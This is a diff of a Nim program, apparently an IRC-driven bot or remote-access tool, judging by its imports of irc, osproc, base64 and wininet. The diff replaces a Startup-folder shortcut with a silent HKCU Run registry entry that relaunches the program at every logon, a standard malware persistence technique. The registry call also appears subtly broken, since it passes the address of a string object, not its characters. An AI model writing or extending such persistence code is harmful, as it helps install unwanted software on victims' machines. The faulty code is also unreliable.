@@ -1,6 +1,6 @@
 import configparser, os, irc, osproc, base64, helper_base64, winim/inc/wininet, winim, random
 
-let current_version* = "1.0.6.6"
+let current_version* = "1.0.6.7"
 
 var
     g_tmp_clean* = false
@@ -119,12 +119,35 @@ proc createShortcut(targetPath: string, shortcutPath: string) =
 
 
 proc updt_createStartupShortcut*() =
+    #### USING STARTUP FOLDER
     var 
-        (_, name, _) = splitFile(getAppFilename())
-        startup_fullpath = getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" & name & ".lnk"
-    if fileExists(startup_fullpath):
-        removeFile(startup_fullpath)
-    createShortcut(getAppFilename(), startup_fullpath)
+         (_, name, _) = splitFile(getAppFilename())
+    #     startup_fullpath = getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" & name & ".lnk"
+    # if fileExists(startup_fullpath):
+    #     removeFile(startup_fullpath)
+    # createShortcut(getAppFilename(), startup_fullpath)
+
+    #### USING REGISTRY
+    var key: HKEY
+    var result: LONG
+
+    result = RegOpenKeyEx(
+        HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_WRITE, addr key
+    )
+    
+    var full_path:string = getAppFilename()
+
+    if result == ERROR_SUCCESS:
+        RegSetValueEx(
+        key, name, 0, REG_SZ, cast[LPBYTE](addr full_path),
+        (full_path.len + 1).DWORD
+        )
+        RegCloseKey(key)
+    else:
+        discard
+        # Handle error
+
 
 
 
